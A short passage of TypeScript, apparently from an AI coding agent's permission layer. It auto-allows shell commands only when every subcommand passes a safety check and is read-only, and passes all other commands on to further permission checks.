      if (bashCommandIsSafe_DEPRECATED(subcmd).behavior !== 'passthrough') {
        return false
      }
      return isCommandReadOnly(subcmd)
    },
  )

  if (allSubcommandsReadOnly) {
    return {
      behavior: 'allow',
      updatedInput: input,
    }
  }

  // 如果不是只读，返回 passthrough，让其他权限检查处理
  return {
    behavior: 'passthrough',
    message: 'Command is not read-only, requires further permission checks',
  }
}
